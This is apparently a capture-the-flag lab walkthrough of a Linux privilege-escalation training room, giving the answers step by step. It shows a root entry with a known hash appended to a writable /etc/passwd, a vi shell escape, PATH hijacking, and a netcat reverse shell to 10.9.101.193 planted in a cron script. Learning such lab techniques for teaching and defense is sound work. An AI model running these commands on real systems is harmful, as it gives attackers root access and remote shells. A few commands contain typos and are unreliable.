# Common Linux Privesc

## :mag: Enumeration

### #2 **What is the target's hostname?**

```
hostname
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-31-02.png>)

### **#3 Look at the output of /etc/passwd how many "user\[x]" are there on the system?**

```
grep '^user' /etc/passwd
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-42-17.png>)

### #4 **How many available shells are there on the system?**

```
cat /etc/shells
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-32-57.png>)

### #5 **What is the name of the bash script that is set to run every 5 minutes by cron?**

```
cat /etc/crontab
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-33-41.png>)

### **#6 What critical file has had its permissions changed to allow some users to write to it?**

```
ls -l /etc/passwd
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-46-23.png>)

## :squid: Abusing SUID/GUID Files

### **#1 What is the path of the file in user3's directory that stands out to you?**

```
find /home/user3 -type f -perm -4000 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 11-53-47.png>)

## :key: Exploiting Writeable /etc/passwd

### #2 Having read the information above, what direction privilege escalation is this attack?

```
vertical
```

### #3 What is the hash created by using this command with the salt, **"new"** and the password **"123"**?

```
openssl passwd -1 -salt new 123
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-04-10.png>)

### #4 What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

### #6 Now, use **"su"** to login as the "new" account, and then enter the password.

```
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
su - new
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-09-47.png>)

## :writing\_hand: Escaping Vi Editor

### **#2 Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?**

```
sudo -l
sudo /usr/bin/vi
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-17-36.png>)

### #4 **Now, type ":!sh" to open a shell!**

```
:!sh
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-21-44.png>)

## :date: Exploiting Crontab

### **#3 What is the flag to specify a payload in msfvenom?**

```
-p
```

### #4 **Create a payload using: "msfvenom -p cmd/unix/reverse\_netcat lhost=LOCALIP lport=8888 R"**

```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.9.101.193
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 12-39-36.png>)

### #5 **What directory is the "autoscript.sh" under?**

```
/home/user4/Desktop
```

### #6 Lets replace the contents of the file with our payload

```
echo 'mkfifo /tmp/blkdu; nc 10.9.101.193 4444 0</tmp/blkdu | /bin/sh >/tmp/blkdu 2>&1; rm /tmp/blkdu' > Desktop/autoscript.sh
```

### #7 **After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener**

```
nc -nvlp 4444
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 13-16-17.png>)

## :motorway: Exploiting PATH Variable

### **#2 Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?**

```
ls
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 13-21-16.png>)

### **#4 What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating**

```
echo "/bin/bash" > ls
```

### #5 We need to make it an executable. What command do we execute to do this?

```
chmod +x ls
```

### #7 Run the "script" file again, you should be sent into a root bash prompt!

```bash
PATH=/tmp:$PATH ./sript
```

![](<../../.gitbook/assets/Screenshot from 2020-09-06 13-27-13.png>)

## ****:link: **Support Material**

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" %}

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html" %}

{% embed url="https://payatu.com/guide-linux-privilege-escalation" %}

****\
****

### **** ****
